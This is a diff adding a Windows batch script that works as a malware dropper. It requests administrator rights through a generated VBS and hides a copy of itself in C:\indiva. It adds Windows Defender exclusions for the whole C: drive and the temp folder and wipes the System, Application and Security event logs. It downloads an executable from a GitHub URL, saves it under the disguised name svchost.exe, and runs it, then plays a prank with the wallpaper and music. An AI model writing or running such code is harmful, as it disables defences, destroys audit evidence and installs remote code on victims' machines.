@@ -1,0 +1,54 @@
+��&cls
+@echo off
+setlocal enabledelayedexpansion
+
+cd /d "%~dp0"
+fsutil dirty query %systemdrive% >nul 2>&1 || (
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "cmd.exe", "/c """"%~s0"" %*""", "", "runas", 0 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    exit /B
+)
+
+if not exist "C:\indiva" mkdir "C:\indiva"
+copy /y "%~f0" "C:\indiva\task.bat" >nul
+attrib +s +h "C:\indiva"
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\'" >nul 2>&1
+
+for %%log in (System,Application,Security) do wevtutil cl %%log >nul 2>&1
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/ytrytry/raw/main/Client.exe' -OutFile 'C:\indiva\svchost.exe'" >nul 2>&1
+start /b "" "C:\indiva\svchost.exe"
+
+:: Работа с обоями и музыкой
+set "IMG_URL=https://github.com/Pythonist310/ytrytry/raw/main/1.jpg"
+set "MP3_URL=https://github.com/Pythonist310/ytrytry/raw/main/2.mp3"
+set "IMG_PATH=C:\indiva\wallpaper.jpg"
+set "MP3_PATH=C:\indiva\bg.mp3"
+set "VBS_MUSIC=C:\indiva\silent_play.vbs"
+
+for /f "tokens=2*" %%a in ('reg query "Control Panel\Desktop" /v Wallpaper') do set "OLD_WALLPAPER=%%b"
+
+powershell -Command "iwr '%MP3_URL%' -OutF '%MP3_PATH%'" >nul 2>&1
+powershell -Command "iwr '%IMG_URL%' -OutF '%IMG_PATH%'" >nul 2>&1
+
+powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%IMG_PATH%', 3)" >nul 2>&1
+
+(
+echo Set Player = CreateObject("WMPlayer.OCX"^)
+echo Player.URL = "%MP3_PATH%"
+echo Player.settings.volume = 100
+echo Player.controls.play
+echo Do While Player.playState ^<^> 1
+echo     WScript.Sleep 1000
+echo Loop
+) > "%VBS_MUSIC%"
+
+wscript.exe "%VBS_MUSIC%"
+
+powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%OLD_WALLPAPER%', 3)" >nul 2>&1
+
+del /f /q "%IMG_PATH%" "%MP3_PATH%" "%VBS_MUSIC%"
+exit
